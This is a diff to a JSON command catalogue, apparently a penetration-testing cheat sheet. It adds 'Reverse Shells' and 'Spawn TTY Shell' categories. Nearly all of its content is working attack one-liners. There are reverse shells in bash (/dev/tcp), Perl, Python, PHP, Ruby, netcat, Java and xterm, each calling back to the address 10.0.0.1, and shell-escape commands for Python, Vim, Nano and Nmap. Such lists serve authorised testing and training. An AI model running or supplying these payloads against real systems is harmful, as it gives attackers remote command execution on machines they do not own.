@@ -40,9 +40,155 @@
     {
       "id": 9,
       "Name": "Post Exploitation"
+    },
+    {
+      "id": 10,
+      "Name": "Reverse Shells"
+    },  
+    {
+      "id": 11,
+      "Name": "Spawn TTY Shell"
     }
   ],
   "commands": [
+    {
+      "Name": "Python BASH TTY Shell",
+      "Category": 11,
+      "Description": "Spawns an interactive BASH TTY shell using Python",
+      "Command": "python -c 'import pty; pty.spawn(\"/bin/bash\")'"
+    },
+    {
+      "Name": "Python 3 BASH TTY Shell",
+      "Category": 11,
+      "Description": "Spawns an interactive BASH TTY shell using Python 3",
+      "Command": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
+    },
+    {
+      "Name": "Echo BASH TTY Shell",
+      "Category": 11,
+      "Description": "Spawns an interactive BASH TTY shell using echo and os.system",
+      "Command": "echo os.system('/bin/bash')"
+    },
+    {
+      "Name": "BASH TTY Shell",
+      "Category": 11,
+      "Description": "Directly spawns an interactive BASH TTY shell",
+      "Command": "/bin/bash -i"
+    },
+    {
+      "Name": "Perl BASH TTY Shell",
+      "Category": 11,
+      "Description": "Spawns an interactive BASH TTY shell using Perl",
+      "Command": "perl -e 'exec \"/bin/bash\";'"
+    },
+    {
+      "Name": "Ruby BASH TTY Shell",
+      "Category": 11,
+      "Description": "Spawns an interactive BASH TTY shell using Ruby",
+      "Command": "ruby -e 'exec \"/bin/bash\"'"
+    },
+    {
+      "Name": "Lua BASH TTY Shell",
+      "Category": 11,
+      "Description": "Spawns an interactive BASH TTY shell using Lua",
+      "Command": "lua -e 'os.execute(\"/bin/bash\")'"
+    },
+    {
+      "Name": "IRB BASH TTY Shell",
+      "Category": 11,
+      "Description": "Spawns an interactive BASH TTY shell using IRB",
+      "Command": "exec \"/bin/bash\""
+    },
+    {
+      "Name": "Vi/Vim BASH TTY Shell (Command 1)",
+      "Category": 11,
+      "Description": "Spawns an interactive BASH TTY shell from within Vi/Vim",
+      "Command": ":!bash"
+    },
+    {
+      "Name": "Vi/Vim BASH TTY Shell (Command 2)",
+      "Category": 11,
+      "Description": "Spawns an interactive BASH TTY shell from within Vi/Vim by setting shell",
+      "Command": ":set shell=/bin/bash:shell"
+    },
+    {
+      "Name": "Nano BASH TTY Shell",
+      "Category": 11,
+      "Description": "Spawns an interactive BASH TTY shell from within Nano editor",
+      "Command": "CTRO+R CTRL+X reset; /bin/bash 1>&0 2>&0"
+    },
+    {
+      "Name": "Nmap BASH TTY Shell",
+      "Category": 11,
+      "Description": "Spawns an interactive BASH TTY shell from within Nmap",
+      "Command": "!bash"
+    },
+    {
+      "Name": "Bash Reverse Shell",
+      "Category": 10,
+      "Description": "Creates a reverse shell using bash, tested on Ubuntu 10.10",
+      "Command": "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"
+    },
+    {
+      "Name": "Perl Reverse Shell",
+      "Category": 10,
+      "Description": "A short, feature-free Perl reverse shell connecting to a specified IP and port",
+      "Command": "perl -e 'use Socket;$i=\"10.0.0.1\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
+    },
+    {
+      "Name": "Python Reverse Shell",
+      "Category": 10,
+      "Description": "A Python reverse shell for Linux with Python 2.7, connecting to a specified IP and port",
+      "Command": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+    },
+    {
+      "Name": "PHP Reverse Shell",
+      "Category": 10,
+      "Description": "A PHP reverse shell assuming TCP connection uses file descriptor 3 (try 4, 5, 6 if needed)",
+      "Command": "php -r '$sock=fsockopen(\"10.0.0.1\",1234);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+    },
+    {
+      "Name": "Ruby Reverse Shell",
+      "Category": 10,
+      "Description": "A Ruby reverse shell connecting to a specified IP and port",
+      "Command": "ruby -rsocket -e'f=TCPSocket.open(\"10.0.0.1\",1234).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
+    },
+    {
+      "Name": "Netcat Reverse Shell",
+      "Category": 10,
+      "Description": "A Netcat reverse shell, requires -e option support",
+      "Command": "nc -e /bin/sh 10.0.0.1 1234"
+    },
+    {
+      "Name": "Netcat FIFO Reverse Shell",
+      "Category": 10,
+      "Description": "An alternative Netcat reverse shell using FIFO for systems without -e option",
+      "Command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f"
+    },
+    {
+      "Name": "Java Reverse Shell",
+      "Category": 10,
+      "Description": "A Java reverse shell connecting to a specified IP and port (untested)",
+      "Command": "r = Runtime.getRuntime(); p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[]); p.waitFor()"
+    },
+    {
+      "Name": "Xterm Reverse Shell",
+      "Category": 10,
+      "Description": "An xterm reverse shell connecting to a specified IP on port 6001",
+      "Command": "xterm -display 10.0.0.1:1"
+    },
+    {
+      "Name": "Xnest Setup",
+      "Category": 10,
+      "Description": "Starts an X-Server to catch incoming xterm on port 6001 (run on your system)",
+      "Command": "Xnest :1"
+    },
+    {
+      "Name": "Xhost Authorization",
+      "Category": 10,
+      "Description": "Authorizes the target to connect to your X-Server (run on your system)",
+      "Command": "xhost +targetip"
+    },
     {
       "Name": "Shodan",
       "Category": 0,
